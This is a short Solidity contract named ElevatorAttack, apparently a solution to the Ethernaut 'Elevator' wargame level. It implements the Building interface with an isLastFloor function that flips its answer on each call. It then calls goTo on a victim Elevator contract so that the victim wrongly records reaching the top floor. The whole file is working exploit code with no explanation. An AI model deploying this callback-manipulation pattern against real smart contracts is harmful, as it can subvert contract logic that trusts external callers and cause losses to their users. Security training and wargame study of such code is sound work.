// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

interface Elevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorAttack is Building{
    bool public top;
    address public victim;

    constructor(bool _top,address _victim) {
        top = _top; 
        victim = _victim;
    }

    function exp() public {
        Elevator c = Elevator(victim);
        c.goTo(0x0);
    }

    function isLastFloor(uint256) external returns (bool){
        top = !top;
        return top;
    }
}